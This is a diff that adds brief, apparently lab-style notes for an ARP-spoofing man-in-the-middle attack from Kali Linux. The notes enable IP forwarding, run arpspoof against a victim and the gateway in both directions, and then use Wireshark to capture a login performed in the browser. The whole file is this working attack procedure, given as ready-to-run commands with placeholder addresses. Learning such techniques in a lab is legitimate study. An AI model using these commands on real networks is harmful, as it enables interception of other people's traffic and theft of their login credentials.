@@ -1,0 +1,16 @@
+1) Run command in Kali terminal 1:
+> cat /proc/sys/net/ipv4/ip_forward
+0
+> echo 1 > /proc/sys/net/ipv4/ip_forward
+> cat /proc/sys/net/ipv4/ip_forward
+1
+> arpspoof -t <IPADDRESS OF VICTIM> <IPADDRESS OF GATEWAY>
+
+2) Run command in kali terminal 2:
+> arpspoof -t <IPADDRESS OF GATEWAY> <IPADDRESS OF VICTIM> 
+
+3) Run command in terminal 3:
+> wireshark
+----------wireshark window opens----------
+step 1: Do a login in backgound in browser
+Step 2: Switch to wireshark and analyse data packets.
